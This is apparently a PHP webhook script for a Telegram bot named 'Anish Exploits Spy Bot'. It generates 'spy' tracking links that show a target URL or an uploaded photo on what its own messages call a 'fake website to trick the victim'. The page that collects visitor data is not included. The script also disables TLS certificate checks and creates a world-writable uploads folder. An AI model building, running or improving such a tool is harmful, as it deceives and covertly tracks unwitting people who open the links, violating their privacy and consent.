<?php
require_once 'config.php';

$botToken = $config['bot_token'];
$website = $config['website'];

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    exit;
}

$chatId = $update["message"]["chat"]["id"] ?? $update["callback_query"]["message"]["chat"]["id"] ?? null;
$text = $update["message"]["text"] ?? "";
$photo = $update["message"]["photo"] ?? null;
$callback = $update["callback_query"] ?? null;

// Handle /start
if ($text == "/start") {
    $keyboard = [
        "inline_keyboard" => [
            [["text" => "📸 Create Custom Photo Spy Link", "callback_data" => "ask_photo"]],
            [["text" => "🔗 Create Normal Link", "callback_data" => "ask_url"]]
        ]
    ];
    sendTelegramMessage($botToken, $chatId, "👾 *Anish Exploits Spy Bot*\n\nChoose an option below to generate your tracking link:", json_encode($keyboard));
}

// User clicked Custom Photo Link
if ($callback && $callback["data"] == "ask_photo") {
    file_put_contents("state_$chatId.txt", "waiting_photo");
    sendTelegramMessage($botToken, $chatId, "📥 *Send a target photo (banner/image)*\nThis image will be shown on the fake website to trick the victim.");
    answerCallback($botToken, $callback["id"]);
}

// User clicked Normal Link
if ($callback && $callback["data"] == "ask_url") {
    file_put_contents("state_$chatId.txt", "waiting_url");
    sendTelegramMessage($botToken, $chatId, "📥 *Send target URL*\nExample: `https://youtube.com`");
    answerCallback($botToken, $callback["id"]);
}

// User sends text (URL for normal link)
if ($text && !str_starts_with($text, "/")) {
    $stateFile = "state_$chatId.txt";
    if (file_exists($stateFile) && file_get_contents($stateFile) == "waiting_url") {
        unlink($stateFile);
        
        $parsed = parse_url($text);
        $domain = str_replace(['www.', '.'], ['', '_'], $parsed['host'] ?? 'link');
        $shortCode = $domain . '_' . substr(time(), -4);
        
        $dbFile = "links.json";
        $db = file_exists($dbFile) ? json_decode(file_get_contents($dbFile), true) : [];
        $db[$shortCode] = [
            'type' => 'url',
            'url' => $text,
            'image' => '',
            'created_by' => $chatId,
            'created_at' => date('Y-m-d H:i:s')
        ];
        file_put_contents($dbFile, json_encode($db));
        
        $spyLink = $website . "/?id=" . $shortCode;
        sendTelegramMessage($botToken, $chatId, "✅ *Spy Link Generated!*\n\n🔗 `$spyLink`");
    }
}

// User sent a Photo for custom link
if ($photo) {
    $stateFile = "state_$chatId.txt";
    if (file_exists($stateFile) && file_get_contents($stateFile) == "waiting_photo") {
        unlink($stateFile);
        
        $fileId = end($photo)['file_id'];
        $fileInfo = json_decode(file_get_contents("https://api.telegram.org/bot$botToken/getFile?file_id=$fileId"), true);
        $filePath = $fileInfo['result']['file_path'];
        $fileUrl = "https://api.telegram.org/file/bot$botToken/" . $filePath;
        
        if (!is_dir("uploads")) {
            mkdir("uploads", 0777, true);
        }
        $targetImageName = "target_" . $chatId . "_" . time() . ".jpg";
        copy($fileUrl, "uploads/" . $targetImageName);
        
        $shortCode = 'custom_' . substr(time(), -5);
        $dbFile = "links.json";
        $db = file_exists($dbFile) ? json_decode(file_get_contents($dbFile), true) : [];
        $db[$shortCode] = [
            'type' => 'photo',
            'url' => 'https://google.com',
            'image' => "uploads/" . $targetImageName,
            'created_by' => $chatId,
            'created_at' => date('Y-m-d H:i:s')
        ];
        file_put_contents($dbFile, json_encode($db));
        
        $spyLink = $website . "/?id=" . $shortCode;
        sendTelegramMessage($botToken, $chatId, "✅ *Custom Photo Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When someone opens this, your uploaded photo will be displayed on the page!");
    }
}

function sendTelegramMessage($token, $chatId, $text, $replyMarkup = null) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = ["chat_id" => $chatId, "text" => $text, "parse_mode" => "Markdown"];
    if ($replyMarkup) $data['reply_markup'] = $replyMarkup;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function answerCallback($token, $id) {
    $url = "https://api.telegram.org/bot" . $token . "/answerCallbackQuery";
    @file_get_contents($url . "?callback_query_id=" . $id);
}
?>
